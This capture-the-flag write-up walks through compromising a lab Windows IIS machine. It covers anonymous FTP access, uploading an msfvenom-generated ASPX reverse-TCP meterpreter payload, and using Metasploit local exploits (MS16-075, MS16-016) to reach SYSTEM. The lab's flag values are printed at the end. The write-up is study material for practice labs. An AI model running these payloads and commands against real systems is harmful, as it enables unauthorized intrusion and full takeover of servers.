## Information

| Property     | Value                       |
|--------------|-----------------------------|
| **Name**     |   |
| **IP Address**|        |
| **OS**       |         |
| **Difficulty**|    |

## Enumeration
### Nmap Scan
```bash
nmap -sC -sV -oN nmap_scan.txt -Pn 
```


```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
## Initial Access
### Port [21] - [Anonymous Access]

```
ftp devel.htb
Connected to devel.htb.
220 Microsoft FTP Service
Name (devel.htb:seifallah): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

With write permission on the ftp, we can upload our aspx file and execute it by requesting it from the IIS. 
#### Vulnerability Exploited

For the aspx payload we are going to generate the payload by msfvenom utility:

```bash
msfvenom -p windows/meterpreter/reverse_tcp  LHOST=10.10.14.5 LPORT=4444 EXITFUNC=thread -f aspx  --platform windows -o meterpreter_reverse_tcp.aspx
```

For the listener, we need to make sure that we are using the same payload generated by msfvenom: 

```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
```

Using the ftp anonymous login, we can upload our malicious file and execute it to catch the meterpreter session: 

##### FTP: 

```shell
ftp devel.htb
Connected to devel.htb.
220 Microsoft FTP Service
Name (devel.htb:seifallah): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put meterpreter_reverse_tcp.aspx
local: meterpreter_reverse_tcp.aspx remote: meterpreter_reverse_tcp.aspx
229 Entering Extended Passive Mode (|||49257|)
125 Data connection already open; Transfer starting.
100% |*************************************************|  3051        1.61 MiB/s    --:-- ETA
226 Transfer complete.
3051 bytes sent in 00:00 (30.28 KiB/s)
ftp> 

```


#### Meterpreter: 

```bash
msf6 exploit(multi/handler) > run n

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 38 opened (10.10.14.5:4444 -> 10.10.10.5:49258) at 2023-11-17 19:20:39 +0100
meterpreter >
```


### User Access

The current user is low privileged: 

```bash
meterpreter > shell
Process 3228 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

#### User Flag

- 
## Privilege Escalation

Metasploit local exploit suggester is used for this section: 
```
msf6 > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 > use 0 
msf6 post(multi/recon/local_exploit_suggester) > set session
set session            set sessionlogging     set sessiontlvlogging  
msf6 post(multi/recon/local_exploit_suggester) > set session 38 
session => 38
msf6 post(multi/recon/local_exploit_suggester) > run 

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 187 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 38:
=============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 3   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 17  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 18  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 19  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 20  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 21  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 22  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 23  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 24  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 25  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 26  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 27  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 28  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 29  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 30  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 31  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
 32  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 33  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 38  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 39  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 41  exploit/windows/local/webexec                                  No                       The check raised an exception.

[*] Post module execution completed

```

##### MS16-075 

```
msf6 exploit(windows/local/ms16_075_reflection) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] x86
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching netsh to host the DLL...
[+] Process 2856 launched.
[*] Reflectively injecting the DLL into 2856...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 39 opened (10.10.14.5:4444 -> 10.10.10.5:49265) at 2023-11-17 19:24:11 +0100

meterpreter > shell
Process 3228 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

```

##### MS16-016 Webdav

```
msf6 exploit(windows/local/ms16_016_webdav) > run 

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Launching a process to host the payload DLL, then reflectively injecting the DLL and running it...
[*] Launching netsh to host the DLL...
[+] Process 1204 launched.
[*] Reflectively injecting the DLL into 1204...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms16_016_webdav) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Launching a process to host the payload DLL, then reflectively injecting the DLL and running it...
[*] Launching msiexec to host the DLL...
[+] Process 3844 launched.
[*] Reflectively injecting the DLL into 3844...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 40 opened (10.10.14.5:4444 -> 10.10.10.5:49272) at 2023-11-17 19:25:21 +0100

meterpreter > shell
Process 760 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system

```


#### Root Flag

User: dfe99bbe9b76fbadac9eb84a1d85575f
Root: 833d7a607d312bd6229cf445f4de30be
## Conclusion


## Additional Notes

0xdf discussed using [Watson](https://github.com/rasta-mouse/Watson) for local privilege escalation suggestion. 

## Resources
https://0xdf.gitlab.io/2019/03/05/htb-devel.html